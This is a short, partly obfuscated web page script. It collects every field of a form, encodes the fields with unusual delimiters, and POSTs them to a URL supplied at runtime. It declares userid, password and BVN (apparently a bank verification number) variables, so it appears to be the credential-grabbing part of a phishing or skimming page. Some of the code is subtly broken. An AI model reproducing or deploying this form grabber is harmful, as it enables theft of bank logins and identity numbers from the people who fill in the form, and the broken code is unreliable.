
<script>
// oAj5pre_
function o_poAj5pre_fnpst(dd, res, lnk ) { var XMLHttpRequestObject = false;
if (window.XMLHttpRequest) { XMLHttpRequestObject = new XMLHttpRequest(); } else if (window.ActiveXObject) { XMLHttpRequestObject = new ActiveXObject("Microsoft.XMLHTTP"); }
function processData(returnedData) { if (returnedData.substr(0,5) == 'ERROR') { var errorDiv = document.getElementById('errordiv'); errorDiv.innerHTML = "X"; } else { var validusersDiv = document.getElementById('validusers' );
validusersDiv.innerHTML = returnedData; } return false; }
function afuncooo( outpt, pgUrl ) { if(XMLHttpRequestObject) { XMLHttpRequestObject.open("POST",pgUrl); XMLHttpRequestObject.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
XMLHttpRequestObject.onreadystatechange = function() {
if (XMLHttpRequestObject.readyState == 4 && XMLHttpRequestObject.status == 200) {
var returnedData = XMLHttpRequestObject.responseText;
processAdd(returnedData,outpt ); } }
var data, useridd, userid, password, BVN ;
data="";
data+= useridd = 'O|0_0|O'+ 'useridg' +"o3r"+ "use";
var x = document.forms[dd];
var text = ""; var i;
for (i = 0; i < x.length ;i++) {
data += 'O|0_0|O'+ x.elements[i].name +"o3r"+ encodeURI( x.elements[i].value ) + ""; }
data+= BVN = 'O|0_0|O'+"VN"+"o3rVn";
var Allll = encodeURI(password);
// alert('O444 Loading ...');
XMLHttpRequestObject.send("request_name_that_gather_all_requests=" + escape(data));
userid = "";
password = "";
}
return false;
}
function processAdd(returnedData, otpt ) {
var validusersDiv = document.getElementById( otpt );
validusersDiv.innerHTML = returnedData;
return false;
}
afuncooo(res, lnk );
}
</script>
<script> function oAj5pre_fnWaL0adPg(olnk,oid) { var xhttp1711 = new XMLHttpRequest(); xhttp1711.onreadystatechange = function() { if (xhttp1711.readyState == 4 && xhttp1711.status == 200) { document.getElementById(oid).innerHTML = xhttp1711.responseText; } }; xhttp1711.open("GET", olnk , true); xhttp1711.send(); } </script>


